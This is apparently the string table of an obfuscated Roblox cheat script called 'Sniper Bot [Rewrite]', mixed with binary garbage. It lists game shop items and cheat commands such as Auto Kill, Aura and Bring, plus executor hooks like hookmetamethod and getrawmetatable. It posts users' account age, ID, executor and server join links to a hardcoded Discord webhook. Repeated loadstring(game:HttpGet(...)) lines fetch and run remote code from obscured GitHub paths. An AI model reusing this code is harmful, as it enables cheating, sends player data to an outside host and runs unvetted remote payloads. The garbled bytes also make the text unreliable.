[[[double-barrel sg] - $1576]]
[[25 [glock ammo] - $68]]
[[[glock] - $563]]
[[[grenade] - $1407]]
[[[pizza] - $6]]
[[5 [rpg ammo] - $1126]]
[[[rpg] - $6753]]
[[12 [revolver ammo] - $84]]
[[[revolver] - $1463]]
[[80 [smg ammo] - $68]]
[[[smg] - $844]]
[[20 [shotgun ammo] - $68]]
[[20 [shotgun ammo] - $68]]
[[[shotgun] - $1407]]
[[[shotgun] - $1407]]
[[25 [silencer ammo] - $56]]
[[[silencer] - $619]]
[[[bloxycola] - $11255087]]
[[N��O闖���;��N]]
local v236702 = [[HighMediumArmor]]
[[f�qY�H�|�/��]]
[[[Ninja Mask]]]
[[[glock] - $563]]
[[[silencer] - $619]]
[[25 [glock ammo] - $68]]
[[25 [silencer ammo] - $56]]
[[[paintball mask] - $68]]
[[[ninja mask] - $68]]
[[[cranberry] - $3]]
[[[tacticalshotgun] - $1970]]
[[20 [tacticalshotgun ammo] - $68]]
[[[p90] - $1126]]
[[120 [p90 ammo] - $68]]
[[[aug] - $2195]]
[[90 [aug ammo] - $90]]
[[[knife] - $169]]
[[[pepperspray] - $84]]
[[[lockpicker] - $141]]
[[[silencer] - $450]]
[[30 [glock ammo] - $68]]
[[[glock] - $338]]
[[[donut] - $6]]
[[[smg] - $844]]
[[80 [smg ammo] - $68]]
[[25 [glock ammo] - $68]]
[[[glock] - $563]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[20 [shotgun ammo] - $68]]
[[[shotgun] - $1407]]
[[[cranberry] - $3]]
[[[pizza] - $6]]
[[[chicken] - $8]]
[[[taser] - $1126]]
[[[weights] - $135]]
[[[heavyweights] - $281]]
[[[popcorn] - $8]]
[[[pizza] - $6]]
[[[rifle] - $1745]]
[[[camera] - $113]]
[[[grenade] - $1407]]
[[[rpg] - $6753]]
[[5 [rpg ammo] - $1126]]
[[[key] - $141]]
[[[chicken] - $8]]
[[[cranberry] - $3]]
[[[pizza] - $6]]
[[[flashlight] - $11]]
[[[flashlight] - $11]]
[[[flashlight] - $11]]
[[80 [smg ammo] - $68]]
[[[smg] - $844]]
[[[double-barrel sg] - $1576]]
[[18 [double-barrel sg ammo] - $68]]
[[25 [silencer ammo] - $56]]
[[[silencer] - $619]]
[[[flashbang] - $619]]
[[[grenade] - $788]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[[bat] - $310]]
[[[bat] - $281]]
[[[lettuce] - $6]]
[[[revolver] - $1463]]
[[5 [rifle ammo] - $281]]
[[[pinkphone] - $450]]
[[[iphoneg] - $675]]
[[[basketball] - $113]]
[[[original phone] - $56]]
[[[iphone] - $675]]
[[[iphoneb] - $675]]
[[[iphonep] - $675]]
[[[orange phone] - $450]]
[[[medium armor] - $1126]]
[[[medium armor] - $1126]]
[[[high-medium armor] - $3377]]
[[[lockpicker] - $141]]
[[[surgeon mask] - $28]]
[[boxing moveset (require: max box stat) - $0]]
[[[default moveset] - $0]]
[[[riot mask] - $68]]
[[[pitchfork] - $360]]
[[[taco] - $2]]
[[[hamburger] - $6]]
[[[taco] - $5]]
[[[hockey mask] - $68]]
[[[lemonade] - $3]]
[[[sledgehammer] - $394]]
[[[lmg] - $4221]]
[[200 [lmg ammo] - $338]]
[[12 [revolver ammo] - $84]]
[[[breathing mask] - $68]]
[[[lockpicker] - $113]]
[[[cranberry] - $3]]
[[[starblox latte] - $6]]
[[[pepperspray] - $169]]
[[[pumpkin mask] - $68]]
[[[skull mask] - $68]]
[[[stopsign] - $338]]
[[[silencerar] - $1407]]
[[120 [silencerar ammo] - $84]]
[[[ak47] - $2532]]
[[90 [ak47 ammo] - $90]]
[[[flowers] - $6]]
[[[firework] - $11255]]
[[[paintball mask] - $68]]
[[[surgeon mask] - $28]]
[[[surgeon mask] - $28]]
[[[surgeon mask] - $28]]
[[[antibodies] - $113]]
[[100 [drumgun ammo] - $225]]
[[[drumgun] - $3377]]
[[[money gun] - $875]]
[[[chicken] - $8]]
[[[shovel] - $360]]
[[[brownbag] - $28]]
[[[shotgun] - $1407]]
[[20 [shotgun ammo] - $68]]
[[[old phone] - $113]]
[[[tele] - $169]]
[[5 [rpg ammo] - $1126]]
[[[rpg] - $22510]]
[[[flamethrower] - $10130]]
[[140 [flamethrower ammo] - $1126]]
[[[basketball] - $113]]
[[[donut] - $11]]
[[12 [grenadelauncher ammo] - $3377]]
[[[grenadelauncher] - $11255]]
[[[hamburger] - $11]]
[[[high-medium armor] - $2589]]
[[[pencil] - $197]]
[[[pepperspray] - $169]]
[[[pizza] - $11]]
[[[surgeon mask] - $28]]
[[[fire armor] - $4501]]
[[[fire armor] - $2701]]
[[[da milk] - $8]]
[[[foodscart] - $17]]
[[[meat] - $14]]
[[5 [rifle ammo] - $281]]
[[[rifle] - $1745]]
[[[teargas] - $5628]]
[[[hotdog] - $9]]
[[18 [double-barrel sg ammo] - $56]]
[[[double-barrel sg] - $1519]]
[[[hamburger] - $11]]
[[[popcorn] - $8]]
[[[drum-shotgun] - $1238]]
[[18 [drum-shotgun ammo] - $73]]
[[[medium armor] - $1131]]
[[[medium armor] - $1407]]
[[[revolver] - $1576]]
[[12 [revolver ammo] - $56]]
[[[fire armor] - $4501]]
[[[medium armor] - $1131]]
[[[whip] - $281]]
[[[hair glue] - $23]]
[[[medium armor] - $1407]]
[[[flintlock] - $1463]]
[[6 [flintlock ammo] - $168]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[[chicken] - $8]]
[[[cranberry] - $3]]
[[18 [double-barrel sg ammo] - $68]]
[[[double-barrel sg] - $1576]]
[[25 [glock ammo] - $68]]
[[[glock] - $563]]
[[[grenade] - $1407]]
[[[pizza] - $6]]
[[5 [rpg ammo] - $1126]]
[[[rpg] - $6753]]
[[12 [revolver ammo] - $84]]
[[[revolver] - $1463]]
[[80 [smg ammo] - $68]]
[[[smg] - $844]]
[[20 [shotgun ammo] - $68]]
[[20 [shotgun ammo] - $68]]
[[[shotgun] - $1407]]
[[[shotgun] - $1407]]
[[25 [silencer ammo] - $56]]
[[[silencer] - $619]]
[[[bloxycola] - $11255087]]
[[[��vC��z]]
local v520456 = [[NinjaMask]]
[[�g	���bV�~J�]]
local v838468 = [[OnCreateNotif]]
[[�����42e����]]
local v302283 = [[OnLapPosition]]
[[|f�]]
local v901986 = [[Notify]]
[[:��1��M#G25]]
local v948602 = [[DisplayName]]
[[y�)���$��]]
[[Welcome, ]]
[[Welcome, adoree]]
[[x�%����]]
local v496568 = [[Vector2]]
[[�x���gg�T�]]
local v808229 = [[AnchorPoint]]
[[˿`d���]]
local v543154 = [[fromRGB]]
[[ww��P��Iᷧ]]
local v373147 = [[BorderSizePixel]]
[[��h*local v826000 = [[ClipsDescendants]]
[[MJY�mI���]]
local v772253 = [[UICorner]]
[[��n�)]]
local v464625 = [[UDim]]
[[H'2d����Hl�]]
local v557314 = [[CornerRadius]]
[[F����0]]
local v526028 = [[UIStroke]]
[[��B�'���*]]
local v706228 = [[Thickness]]
[[�����]]
local v922621 = [[Color]]
[[{R���<��"�]]
local v801951 = [[Transparency]]
[[="O�]]
[[<x<<]]
[[1��1��]]
local v480500 = [[Gotham]]
[[ Xlocal v547583 = [[TextWrapped]]
[["��!7����Ix�;]]
local v332853 = [[TextYAlignment]]
[[����$�]]
local v667114 = [[Center]]
[[f�ZH�z�0�)��4��]]
local v270258 = [[TextXAlignment]]
[[�?���cz�T�$�4��ʛ]]
local v324140 = [[TextTransparency]]
[[؀L�su]]
local v416997 = [[table]]
[[�1_9��]]
local v128789 = [[insert]]
[[/��JA��]]
local v467806 = [[Create]]
[[Ш��bv�dE�]]
local v253501 = [[TweenInfo]]
[[���P0�u#�]]
local v989179 = [[EasingStyle]]
[[n�^f�]]
local v639653 = [[Sine]]
[[�ر��d]]]
[[[[���local v993204 = [[Play]]
[[�<S>4]]
local v376501 = [[Quad]]
[[�.���Yo�S�1�2���]]
local v981421 = [[EasingDirection]]
[[�W�~]]
local v513401 = [[Out]]
[[
��g&]]
local v842664 = [[task]]
[[u-Mj]]
local v945925 = [[delay]]
[[��_�7���Ǉ�]m���0]]
local v819607 = [[FetchBannedAccounts]]
[[�']]
local v774405 = [[D]]
[[��P��]]
local v497684 = [[ReChat]]
[[�Z�;i
���]]
local v163171 = [[Get_Player]]
[[\�]]
local v341230 = [[W]]
[[!����Ep\4_���]]
local v276873 = [[GetPlayersInRange]]
[[��]]
local v629981 = [[b]]
[[���ܑ�]]
local v885297 = [[Check]]
[[2�]]
local v607273 = [[G]]
[[���`
]>�x]]
local v547664 = [[Velocity]]
[[��*H���:�t]]
local v932623 = [[ZeroVelocity]]
[[]&�zb��Ҿ[���]]
local v288749 = [[IsWhitelisted]]
[[�w]]
local v336793 = [[r]]
[[��]]
local v384424 = [[V]]
[[ O[6�d�J�kQ�kW���]]
local v123636 = [[CreateTargetAbility]]
[[
�]]
local v420333 = [[v]]
[[n�Em�N�local v147928 = [[CreateThings]]
[[�Z�I� ]]
local v551632 = [[Reset]]
[[�*]]
local v887136 = [[O]]
[[L�%��]]
local v643941 = [[Stop]]
[[:G]]
local v363656 = [[m]]
[[S��a)Y]]
local v881420 = [[MoveTo]]
[[��]]
local v349935 = [[X]]
[[�ϝ�HL�_�]]
local v368654 = [[ShootGun]]
[[��w���IQ�]]
local v642976 = [[GetValidAnim]]
[[�mlocal v281479 = [[TrackStop]]
[[.��̪�u4]]
local v271493 = [[AnimPlay]]
[[�F跠local v229765 = [[AnimStop]]
[[X5���&��]]
local v537414 = [[AnimLoop]]
[[�}-���Fv�gP]]
local v456877 = [[StopAllAnims]]
[[5m]]
local v204472 = [[Z]]
[[��R�=�+��?��kR��]]
local v459184 = [[UpdateGunsHolder]]
[[<�2��z]]
local v978223 = [[IsNaN]]
[[��]]
local v107990 = [[N]]
[[���Ŏ�}e]]
local v415318 = [[Pullback]]
[[S��pE]]
local v942826 = [[Status]]
[[��]]
local v884511 = [[C]]
[[�cz���QW�C�;�:]]
local v997541 = [[BringingTarget]]
[[a�]]
local v152063 = [[P]]
[[�8a���]]
local v705276 = [[Bring]]
[[��]]
local v299028 = [[e]]
[[	�X�]]
local v442288 = [[Summon]]
[[?��ZB�F]]
local v784524 = [[UserId]]
[[,���Ks�*#M��]]
local v497424 = [[getconnections]]
[[�͙�JD]]
local v741365 = [[Idled]]
[[-�(�W�]]
local v734724 = [[Disable]]
[[1�Q@/#j#]]
local v739166 = [[setfpscap]]
[[\���]]
[[Fp!]]
[[Fp!]]
[[��c�Q]]
[[UnFp!]]
[[:rf]]
[[X�]]
[[UnFp!]]
[[*���G]]
[[Stop!]]
[[Stop!]]
[[X6���]]
[[Bind!]]
[[�5�Pb ]]
[[UnBind!]]
[[yO��]]
[[Void!]]
[[4�'��Uq]]
[[UnVoid!]]
[[����@)]]
[[Crew!]]
[[�Bf�?[[Uncrew!]]
[[%��.��-]]
[[ShowSc!]]
[[Y�!{��@]]
[[HideSc!]]
[[��]]
[[Rj!]]
[[Rj!]]
[[�z��o7j]]
[[Leave!]]
[[Leave!]]
[[����]]
[[Floss!]]
[[��T�u]]
[[Inv!]]
[[D�8��xD]]
[[Haunt!]]
[[F೿��]]
[[Float!]]
[[L�>��%]]
[[Coin!]]
[[��gU�]]
[[Zen!]]
[[l�г�]]
[[Lay!]]
[[_o�~d�]]
[[Beat!]]
[[��H�0�?�]]
[[Griddy!]]
[[�	���b!]]
[[Custom!]]
[[>������
07]]
[[StopAnim!]]
[[�s�]]
[[Re!]]
[[���~[�b6�D�z1]]
[[ForceExclusive!]]
[[ForceExclusive!]]
[[
��g,d��,�8�@��K]]
[[DisableExclusive!]]
[[DisableExclusive!]]
[[-�5��]]
[[Sentry!]]
[[Sentry!]]
[[s䤰3b��X]]
[[UnSentry!]]
[[UnSentry!]]
[[�9�b�]]
[[Aura!]]
[[Aura!]]
[[3��<��]]
[[UnAura!]]
[[UnAura!]]
[[?��VC�]]
[[GList!]]
[[GList!]]
[[�� 
�K]]
[[AGun!]]
[[�]]
[[G!]]
[[�p
B]]
[[AG!]]
[[t�η�]]]
[[RGun!]]
[[\��]]
[[R!]]
[[�tq]]
[[RG!]]
[[�>i~]]
[[SO!]]
[[SO!]]
[[.���]]
[[RSO!]]
[[RSO!]]
[[����C)]]
[[Dist!]]
[[Dist!]]
[[Br�9�o]]
[[Pred!]]
[[Pred!]]
[[���}�b]]
[[Mult!]]
[[Mult!]]
[[v�fm�]]
[[Time!]]
[[Time!]]
[[��eC��;��Ҏ�]]
[[SWhitelist!]]
[[SWhitelist!]]
[[gw��_ݞ��]]
[[RWhitelist!]]
[[Hµ�i�]]
[[����]]
[[����]]
[[3S]]
[["]]
[[RWhitelist!]]
[[�Z���6�d�Q]]
[[DWhitelist!]]
[[DWhitelist!]]
[[I�Kg��}�0�]]
[[LWhitelist!]]
[[LWhitelist!]]
[[)�PpO5X9�]]
[[ClearList!]]
[[ClearList!]]
[[��fF����إ�]]
[[ClearAuraW!]]
[[ClearAuraW!]]
[[},\���Cm�S� �]]
[[ClearWhitelist!]]
[[ClearWhitelist!]]
[[�D8�]]
local v134000 = [[AuraW]]
local v522471 = [[AuraW]]
[[��窢�]]
local v142314 = [[UnAuraR]]
local v192852 = [[UnAuraR]]
local v688962 = [[Whitelist]]
[[�k9�i3�A�ld]]
local v346044 = [[Unwhitelist]]
local v911564 = [[Unwhitelist]]
[[��]]
local v511621 = [[B]]
[[�.]]
local v242224 = [[S]]
[[�;]]
local v584465 = [[A]]
[[˕]]
local v526512 = [[L]]
[[2��(���$��]H]]
local v823834 = [[AddConnection]]
[[Ӛl�]]
local v223501 = [[Knock]]
[[K��~\2�u]]
local v568143 = [[Heartbeat]]
[[A�kX��m]]
local v382314 = [[Connect]]
[[a�]]
local v678807 = [[q]]
[[�Z6��]]
local v890144 = [[Stomp]]
[[8x]]
local v264755 = [[l]]
[[�D>Ė�cl]]
local v966429 = [[Auto Kill]]
[[8]]
local v250691 = [[k]]
[[�D$C���]]
local v650363 = [[Gun Loop]]
[[�]]
local v823791 = [[E]]
[[<�4��]]
local v736437 = [[Aura]]
[[�D]]
local v110056 = [[u]]
[[���Ra\>]]
local v765464 = [[Sentry]]
local v611280 = [[jp]]
local v766762 = [[j]]
[[�;�����y(]]
local v615617 = [[Real Time]]
[[�]]
local v991194 = [[T]]
[[���t�3�Y]]
local v890999 = [[Stepped]]
local v436944 = [[EA]]
local v823261 = [[F]]
[[����4��m[#�n>]]
local v714688 = [[hookmetamethod]]
[[��G�2�#��0��iB��}]]
local v722414 = [[getnamecallmethod]]
[[oS��~d��̲]]
local v571468 = [[newcclosure]]
[[OpZ/1U.���`p�@_�]]
local v951267 = [[sethiddenproperty]]
[[����UY�G�0���5�]]
local v371236 = [[getrawmetatable]]
[[Et}�xF��9���]]
local v779652 = [[setreadonly]]
[[�\ۓ�BE��� ]]
local v592359 = [[__namecall]]
[[��]]
local v964109 = [[Y]]
[[C��QO14l:]]
local v926883 = [[__newindex]]
[[�:]]
local v922963 = [[o]]
[['��F忋]]
local v506247 = [[__index]]
[[I�]]
local v407058 = [[n]]
[[�k���K]]
local v184037 = [[pcall]]
[[]%3�\O�ѳM]]
local v802059 = [[JSONDecode]]
[[>Ƴ����,c��
]]
local v130360 = [[http_request]]
[[/��C]]
local v676316 = [[Url]]
[[�^��i!q�
�v�}Z��ӽ����:[[https://raw.githubusercontent.com/XK5NG/XK5NG.github.io/refs/heads/main/Banned_Account.json]]
[[б��ow�]]
local v539053 = [[Method]]
[[��]]
local v642846 = [[GET]]
[[@�@n��]]
local v303114 = [[Magnitude]]
[[�3[4�n(@]]
local v856667 = [[Vector3]]
[[��1�)]]
local v998156 = [[zero]]
[[k���	(|��-�=�l�)E
x���]]
local v207965 = [[AssemblyLinearVelocity]]
[[O��|e�PG��0��͛�B(j��local v435680 = [[AssemblyAngularVelocity]]
[[�,]]
[[�]]
[[��*�S������]]
[[b=i3I5<=c13x]]
[[��n>
]]
local v161987 = [[Body]]
[[��]]
[[�]]
[[�]]
[[0�\�]]
local v681098 = [[spawn]]
[[���І]]
local v441804 = [[wait]]
[[��]]
local v787992 = [[h]]
[[�q��local v813943 = [[Command]]
[[c��y$s�]]
local v861430 = [[Premium]]
[[�8���[l]]
local v999536 = [[Shield]]
[[�?]]
local v480806 = [[x]]
[[���p��]]
local v564409 = [[Exclusive]]
[[��*�D�v�M]]
[[[[��-]]
[[�>]]
[[�i�[�5�S]]
[[[[!�$�O@9r]]
[[7[[�[��ǲZͿ��]]
local v775728 = [[PlayerLeaved]]
[[rBg�ۥz䷜��]]
local v229645 = [[PlayerRemoving]]
[[y� ��local v848453 = [[PlayerAdded]]
[[�#Lː�OW�A]]
local v576267 = [[SendWebhook]]
[[|\��]]
local v938410 = [[tostring]]
[[����(��]]
[[[[6>��Ɂ�Cjw��L�}�b�_YMi���]
�E�&���]]
[[https://i.e-z.host/p/raw/z5uohbithj]]
[[���p
E��6;e��9[[https://i.e-z.host/p/raw/tas56qhe0m]]
[[ޫf�]]
[[��"]]
[[ O
_#�h4�Z�p~�k\��ϳ�ޤ]]
local v866210 = [[ChatWindowConfiguration]]
[[���eZ��]]
local v467410 = [[Enabled]]
[[�6b����T��}e�]]
local v884899 = [[ClientAnimations]]
[[6��՞�+_��]]
local v867296 = [[SmallGunAim]]
[[�H,���nw�CG]]
local v527401 = [[AnimationId]]
[[�D��x!8�Q�sR�5]]
[[rbxassetid://0]]
[[���m	R�o	�Y]]
local v960703 = [[SmallGunShot]]
[[���7�����-,s���]]
local v852572 = [[SmallGunAimShot]]
[[�ΉѴC]]
local v573556 = [[Block]]
[[P)&����Ms�<]]
local v223726 = [[UserSettings]]
[[�t��O��]]
local v444422 = [[GetService]]
[[��0�O�
�An��׹O�]]
local v963515 = [[UserGameSettings]]
[[�{��m79�J�b�]]
local v735239 = [[MasterVolume]]
[[S"��pX��]]
local v158945 = [[settings]]
[[�j�D�!���]]
local v478613 = [[Rendering]]
[[V�ZA���5��-]]
local v834339 = [[QualityLevel]]
[[�(����Vk�=]]
local v923382 = [[FireServer]]
[[�F���$�	��
��Y]]
local v336685 = [[EnterPromoCode]]
[[https://discord.com/api/webhooks/1416594884932010078/eqr7JU1Az3SznMoY1gPVavuQfGQAD0_B0wWXsOrDXb-TaOGqid-DfSAuXtWJagvLDDsl]]
[[e�f�]]
local v894592 = [[content]]
[[���ګ�]]
local v571287 = [[title]]
[[G��^x�H��2߫���nz��]]
[[Sniper Bot [Rewrite]]]
[[�,z���5�h�\t�]]
local v224807 = [[identifyexecutor]]
[[:r�@�b�h	�]]
[[# Executor: ]]
[[�r����\q�&]]
local v709022 = [[description]]
[[�};�]]
local v295193 = [[type]]
[[˫{h�]]
local v637718 = [[rich]]
[[�U��v ]]
local v788055 = [[color]]
[[_C�ru]]
local v707846 = [[name]]
[[[[**Users info:**]]
[[Y�&q���4�]]
local v625962 = [[AccountAge]]
[[ؔM]]
[[``]]
[[�O_���=�-�B]]
[[
Account Age: ]]
[[�L!.�l�7R�]]
[[
UserID : ]]
[[��u~��h�"�X�O]]
[[
DisplayName: ]]
[[�n��t�-�P�U@]]
[[``Username: ]]
[[�19]?]]
local v570768 = [[value]]
[[����5�]]
local v203607 = [[inline]]
[[dͲ>��HXĀ1.�V�c
�L�ǌ]]
[[**JoinLink (Website V1)**]]
[[��>s��]]
local v416075 = [[PlaceId]]
[[���˫�]]
local v449507 = [[JobId]]
[[/ߟO@�]]
[[")```]]
[[�9p]]
[[, "]]
[[3��vr�#/A\,���{i�T�<�4њƋ�[c���7�S�
H]]
[[```Roblox.GameLauncher.joinGameInstance(]]
[[q�Z�	4�h���JB껿)�(��k�]]
[[**JoinLink (Website V2)**]]
[[^�WT�I�
�K]]
[[&placeId=]]
[[�U]]
[[%]]
[[����D2��#�h��ˎ�d[m��>�"�X�@�sy��Ҷ]﹛0���]]
[[https://www.roblox.com/games/start?launchData=]]
[[��n�3��:��c}�]]
[[**(Executor)**]]
[[�UB���]]
[[')```]]
[[�����A`�0-U)v��\U��9�+��#��a@��|ub�q�{
�uA��ɏ�衞5;����/�wx@R��(�]]
[[```game:GetService('TeleportService'):TeleportToPlaceInstance(2788229376, ']]
[[��0��Ķ����4:��Gr�6j]]
[[**(Mobile) Hold to copy**]]
[[��]]
[[')]]
[[��SFɿ����b$eژN�>�P�
�9f���LE�����.��`v31j'2���fv�o��n����[s2��]]
[[game:GetService('TeleportService'):TeleportToPlaceInstance(2788229376, ']]
[[�99l.�]]
local v501244 = [[fields]]
[[�2�c?�]]
local v648669 = [[embeds]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[���]]
local v801773 = [[Yes]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/xxxxx"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/xxxxx"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/xxxxx"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/xxxxx"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[��]]
local v741489 = [[In]]
[[/@]]
[[�]]
[[\o]]
[[�]]
[[�]]
[[@ s��]]
local v190509 = [[remove]]
[[�>v��PI]]
local v340662 = [[Destroy]]
[[H8b����]]
local v362288 = [[setfflag]]
[[��'�h�-Yr���HJ�D�&���+��iQ]]
local v380148 = [[NextGenReplicatorEnabledWrite4]]
[[<� ��Q]]
local v588052 = [[false]]
[[i}Un��q�]]
[[�
